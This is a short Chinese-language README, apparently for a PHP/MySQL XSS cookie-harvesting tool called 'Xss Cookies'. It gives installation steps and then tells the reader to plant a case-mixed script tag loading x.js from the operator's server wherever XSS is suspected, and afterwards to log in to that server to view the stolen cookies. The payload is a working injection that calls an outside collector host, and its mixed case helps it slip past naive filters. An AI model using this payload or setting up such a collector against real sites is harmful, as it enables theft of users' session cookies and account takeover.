# 🍪 Xss Cookies
![Version](https://img.shields.io/badge/Version-1.0-orange)
![License](https://img.shields.io/badge/license-MIT-yellow)
![python](https://img.shields.io/badge/PHP->=5.0-blue)
![MySQL](https://img.shields.io/badge/MySQL->=5.2-brightgreen)

简介：一款XSS漏洞测试辅助工具，自动获取Cookies
![Xss Cookies](https://s3.jpg.cm/2021/09/09/ISpxlw.png)

---

## 一、安装
### 1. 修改配置文件 `config.php` 修改以下信息
 - MySQL 数据库信息
 - 管理员账号密码
 - 服务端地址

### 2. 当前目录所有文件部署到 php web server

### 3. 打开 `http://server_ip/install/` 进行安装

## 二、使用
### 1. 将如下代码植入怀疑出现 xss 的地方
```html
<sCRiPt sRC=http://server_ip/x.js></sCrIpT>
```

### 2. 打开 `http://server_ip/` 登录查看 cookies 信息

